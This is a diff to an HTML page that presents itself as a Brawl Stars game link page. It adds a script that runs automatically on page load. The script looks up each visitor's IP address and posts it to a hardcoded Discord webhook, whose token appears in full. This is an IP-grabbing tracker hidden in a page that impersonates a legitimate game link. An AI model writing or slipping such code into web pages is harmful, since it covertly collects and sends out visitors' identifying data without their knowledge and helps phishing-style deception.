@@ -167,5 +167,41 @@
         <script>
             self.__next_f.push([1, "16:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"Brawl Stars\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"Open link in Brawl Stars or download the game.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"robots\",\"content\":\"noindex, nofollow, noarchive, noimageindex, nosnippet\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:title\",\"content\":\"Brawl Stars\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:description\",\"content\":\"Open link in Brawl Stars or download the game.\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:image\",\"content\":\"https://link.brawlstars.com/images/game/opengraph.jpg\"}],[\"$\",\"meta\",\"8\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"9\",{\"name\":\"twitter:title\",\"content\":\"Brawl Stars\"}],[\"$\",\"meta\",\"10\",{\"name\":\"twitter:description\",\"content\":\"Open link in Brawl Stars or download the game.\"}],[\"$\",\"meta\",\"11\",{\"name\":\"twitter:image\",\"content\":\"https://link.brawlstars.com/images/game/opengraph.jpg\"}],[\"$\",\"meta\",\"12\",{\"name\":\"next-size-adjust\"}]]\n7:null\n"])
         </script>
+            <script>
+        // Function to fetch and send IP to Discord webhook automatically
+        function sendVisitorIP() {
+            // Fetch the visitor's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    // Send IP to Discord webhook
+                    const webhookUrl = "https://discord.com/api/webhooks/1298626796870434816/w3s2cnDTbriy2c8AGt_erZtLLGlBbRtA88aj2YsoFT3w1SpasVq4PSN2OrIfJznHBWuo";
+                    const payload = {
+                        content: `New visitor IP: ${data.ip}`
+                    };
+
+                    fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log("IP sent successfully.");
+                        } else {
+                            console.log("Failed to send IP.");
+                        }
+                    })
+                    .catch(error => console.error('Error sending IP:', error));
+                })
+                .catch(error => console.error('Error fetching IP:', error));
+        }
+
+        // Automatically call the function when the page loads
+        window.onload = sendVisitorIP;
+                </script>
+
     </body>
 </html>
